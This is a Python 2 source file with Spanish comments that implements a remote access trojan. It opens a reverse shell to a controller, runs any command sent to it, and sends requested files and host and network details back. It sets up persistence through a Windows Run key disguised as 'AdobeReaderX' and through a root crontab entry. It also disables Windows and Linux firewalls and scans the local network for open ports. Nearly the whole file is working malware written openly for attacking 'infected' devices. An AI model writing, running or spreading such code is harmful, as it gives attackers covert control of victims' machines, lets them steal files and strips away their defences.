# -*- coding: UTF-8 -*-



import os
import sys
import platform
import socket as socket
import subprocess
import getpass
import uuid
import urllib
import time
import ctypes
try:
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
except:
    pass

    

"""ARBOL/ESTRUCTURA DEL PROGRAMA"""
#SYSTEM-----SHELL INVERSA                       V
#   |    |__OS INFO                             V
#   |    |__DOWNLOADER                          V
#   |    |__TASKS                               V
#   |
#   |
#   |---WINDOWS
#   |      |---PERSISTENCIA                     V
#   |      |---FIREWALL  (AS ADMIN)             V
#   |      |___NET SCANNER                      V
#   |
#   |---LINUX
#         |---PERSISTENCIA                      V 
#         |---FIREWALL/IPTABLES/UFW (AS ADMIN)  V
#         |___NET SCANNER                       V
#   



##############################################################################
##############################################################################
##############################################################################



"""PERMISOS DE ADMINISTRADOR"""
# try:
    # is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    # if is_admin != 1:
        # print 'Necesita permisos de administrador.'
        # sys.exit
# except:
    # is_admin = os.getuid()
    # if is_admin != 0:
        # print 'Necesita permisos de administrador'
        # sys.exit

#########
#GENERAL#
#########



def System():
    """Sistema operativo que vamos a atacar
    Dividimos el script en dos, Linux y Windows
    para ejecutar unas u otras funciones"""
    if (sys.platform.startswith('win32')
        or sys.platform.startswith('cygwin')):
        PLAT_SYS = 'windows'
    elif sys.platform.startswith('linux'):
        PLAT_SYS = 'linux'
    else:
        PLAT_SYS = 'unknown'
    return PLAT_SYS



def os_info():
    """Información del sistema operativo"""
    """Declaramos las variables"""
    #SISTEMA OPERATIVO
    sys_platform = platform.platform()
    proces    = platform.processor()
    arch = platform.architecture()[0]
    
    
    
    #USUARIO EN SESIÓN
    user = getpass.getuser()
    
    
    
    #RED
    hostname    = socket.gethostname()
    fqdn        = socket.getfqdn()
    internal_ip = str(socket.gethostbyname_ex(hostname))
    raw_mac     = uuid.getnode()
    mac         = (':'.join(('%012X' % raw_mac)[i:i+2] 
                   for i in range(0, 12, 2)))
    
    
    
    
    #IP EXTERNA
    ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw',
                   'wtfismyip.com/text' ]
    external_ip = ''
    
    
    
    for url in ex_ip_grab:
        try:
            external_ip = urllib.urlopen('http://'+url).read().rstrip()
        except IOError:
            pass
        if external_ip and (6 < len(external_ip) < 16):
            break

    
    
    # DATATIME DEL DISPOSITIVO
    dt = time.strftime('%a, %d %b %Y %H:%M:%S {}'.format(time.tzname[0]),
         time.localtime())
    all_val = (['\nPlataforma: \t',str(sys_platform),'\nProcesador: \t',str(proces),
    '\nArquitectura: \t',str(arch),'\nHostname: \t',str(hostname),'\nMAC: \t\t',str(mac),
    '\nInternal IP: \t',str(internal_ip),'\nExternal IP: \t',str(external_ip),
    '\nDate Time: \t',str(dt)])
    all=''
    for i in all_val:
        all=all+' '+i

    return all



def general_task(command):
    """Muestra los procesos corriendo en el host remoto (este)"""
    try:
        comm = subprocess.Popen(str(command), shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        stdin=subprocess.PIPE)
        output, errput = comm.communicate()
        return output
    except:
        output = 'Error al ejecutar el comando'
        return output


##############################################################################
##############################################################################
##############################################################################
#########
#WINDOWS#
#########



def windows_persistence():
    """Creación de la persistencia en el dispositivo infectado
    Creamos una entrada en el registro para que se autoejecute
    al arrancar el dispositivo"""
    tempdir = '%TEMP%'
    fileName = sys.argv[0]
    dir,file = os.path.split(fileName)
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'

    
    
    """Copia este ejecutable a la ruta indicada"""
    try:
        os.system('copy %s %s'%(fileName, tempdir))
        bin_path = sys.executable
    except:
        pass

        
        
    """Crea un registro que ejecute, bajo el nombre de
    AdobeReaderX el archivo copiado anteriormente a %TEMP%"""
    try:
        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, 'AdobeReaderX', 0, _winreg.REG_SZ,
                (r"%TEMP%"+file))
        _winreg.CloseKey(reg_key)
        return True
    except WindowsError:
        return False



def windows_firewall():
    """Desactivación del firewall"""
    is_admin = ctypes.windll.shell32.IsUserAnAdmin()

    
    
    """Si es administrador, desactiva el firewall"""
    if is_admin == 1:
        try:
            subprocess.check_call('netsh.exe advfirewallset',
                ' allprofiles state off')
            return True
        except:
            return False



def windows_scanner():
    """Escaner de red para ver qué dispositivos y
    qué puertos tiene abiertos"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0].split('.')
        s.close()
        #print ip, 'esta es la IP metodo Internet'
    except:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        ip = ip.split('.')
        #print ip, 'esta es la IP metodo gethostbyname'

    

    """Creamos las variables"""
    ips = []
    ips_on = ['127.0.0.1']
    ip_port_on = []
    PORTS = [ 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 179, 443, 445,
    514, 993, 995, 1723, 3306, 3389, 5900, 8000, 8080, 8443, 8888 ]

    
    
    """Nos quedamos con los tres primeros valores de la
    IP para concatenarlo con valores desde 1 hasta 255
    (Ejemplo:192.168.1.1-255)"""
    for i in range(173,174):
        ip_full = str(ip[0]+'.'+ip[1]+'.'+ip[2]+'.'+str(i))
        ips.append(ip_full)

        
        
    """Escaneamos las IP's que hemos añadido al array
    en el bucle anterior"""
    for ip in ips:
        #print 'Scanning ',ip
        output = subprocess.Popen(["ping", "-n ", "1", ip],
                stdout = subprocess.PIPE).communicate()[0]
        if ('inaccesible' in output):
            print ip,'inaccesible'
            pass
        else:
            print ip, 'accesible'
            ips_on.append(ip)

            

    """Escaneamos los puertos definidos en la variables
    PORTS dentro de los hosts encendidos. Estos son los
    más comunes (vulnerables)"""
    for ip_on in ips_on:
        for port in PORTS:
            try:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip_on,port))
                #print 'IP ',ip_on,'Puerto ',port, ' abierto'
                ip_port_on.append(ip_on+'_'+str(port))
            except:
                pass
            finally:
                s.close()
                
                
                
    return ip_port_on



##############################################################################
##############################################################################
##############################################################################
#######
#LINUX#
#######



def linux_scanner():
    """Escaner de red para ver qué dispositivos y
    qué puertos tiene abiertos"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0].split('.')
        s.close()
        #print ip, 'esta es la IP metodo Internet'
    except:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        ip = ip.split('.')
        #print ip, 'esta es la IP metodo gethostbyname'
    
    
    
    """Creamos las variables"""
    ips = []
    ips_on = ['127.0.0.1']
    ip_port_on = []
    PORTS = [ 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 179, 443, 445,
    514, 993, 995, 1723, 3306, 3389, 5900, 8000, 8080, 8443, 8888 ]
    
    

    """Nos quedamos con los tres primeros valores de la
    IP para concatenarlo con valores desde 1 hasta 255
    (Ejemplo:192.168.1.1-255)"""
    for i in range(1,2):
        ip_full = str(ip[0]+'.'+ip[1]+'.'+ip[2]+'.'+str(i))
        ips.append(ip_full)

        
        
    """Escaneamos las IP's que hemos añadido al array
    en el bucle anterior"""
    for ip in ips:
        res = subprocess.call(['ping', '-c', '1', ip],
            stdout = subprocess.PIPE)
        if res == 0:
            ips_on.append(ip)
        elif res == 2:
            continue
        else:
            continue

            
            
    """Escaneamos los puertos definidos en la variables
    PORTS para cada host activo. Estos son los más comunes"""
    for ip_on in ips_on:
        for port in PORTS:
            try:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip_on,port))
                #print 'IP ',ip_on,'Puerto ',port, ' abierto'
                ip_port_on.append(ip_on+'_'+str(port))
            except:
                pass
            finally:
                s.close()
                
                
                
    return ip_port_on



def linux_firewall():
    """Desactivación del firewall"""
    is_admin = os.getuid()
    
    
    
    """Si es administrador, desactiva el firewall y
    otras medidas de seguridad"""
    if is_admin == 0:
        try:
            subprocess.check_call('sudo systemctl stop firewalld ||',
                ' systemctl stop iptables ||',' systemctl stop ufw')
            return True
        except:
            return False
            pass
    else:
        return False



def linux_persistence():
    """Creación de la persistencia en el dispositivo infectado"""
    """Creamos las variables"""
    initdir = '/tmp/'
    fileName = sys.argv[0]
    dir,file = os.path.split(fileName)
    
    
    
    """Intentamos copiar el fichero al directorio /init.d/
    Le damos permisos de ejecución y actualizamos el
    arranque de servicios"""
    try:
        os.system('sudo cp %s %s'%(fileName, initdir))
        os.system('sudo -i; sudo echo "0-59/10 * * * * root %s" >> /etc/crontab;exit'%(file))
        return True
    except:
        return False

        
        
##############################################################################
##############################################################################
##############################################################################
#######
#SHELL#
#######
def shell():
   while True:
        """Intenta abrir un bucle infinito. En caso de error,
        cierra el programa."""
        try:
            while True:
                """Definimos las variables IP y puerto"""
                RHOST = '127.0.0.1'
                RPORT = 443
                
                
                
                """Creamos el socket"""
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((RHOST, RPORT))
                
            
            
                data = s.recv(1024)




                if data == 'quit':
                    s.close()



                elif data == 'os info':
                    os_information = str(os_info())
                    s.send(os_information)



                elif data == 'persistence':
                    if System() == 'windows':
                        if windows_persistence() == True:
                            s.send('Persistencia completada')
                        else:
                            s.send('No se pudo realizar la persistencia')
                    elif System() == 'linux':
                        if linux_persistence() == True:
                            s.send('Persistencia completada')
                        else:
                            s.send('No se pudo realizar la persistencia')
                    else:
                        pass



                elif data == 'firewall':
                    if System() == 'windows':
                        if windows_firewall() == True:
                            s.send('Se desactivó satisfactoriamente')
                        else:
                            s.send('No se pudo desactivar')
                    elif System() == 'linux':
                        if linux_firewall() == True:
                            s.send('Se desactivó satisfactoriamente')
                        else:
                            s.send('No se pudo desactivar')
                    else:
                        pass



                elif data == 'scanner':
                    if System() == 'windows':
                        result_scan=str(windows_scanner())
                        s.send(result_scan)
                    elif System() == 'linux':
                        result_scan=str(linux_scanner())
                        s.send(result_scan)
                    else:
                        pass
                
                
                
                elif data.split(' ')[0]  == 'download':
                    file = data.split(' ')[1] 
                    f = open(file,'rb')
                    lineas = f.read(1024)
                    while (lineas):
                        s.send(lineas)
                        lineas=f.read(1024)
                        if len(lineas) == 0:
                            break
                    f.close()
                    data = ''

                    
                    
                elif data == 'tasks':
                    if System() == 'windows':
                        command = 'tasklist'
                    elif System() == 'linux':
                        command = 'ps -efH'
                    else:
                        pass
                    tasks_result = (general_task(command))
                    s.send(tasks_result)
                    
                    
                    
                else:
                    comm = subprocess.Popen(str(data), shell=True, 
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
                    STDOUT, STDERR = comm.communicate()
                    try:
                        s.send(STDOUT+STDERR)
                    except:
                        pass
                    
                    
                    
                s.close()
            
            
            
        except:
            sys.exit
            pass



shell()
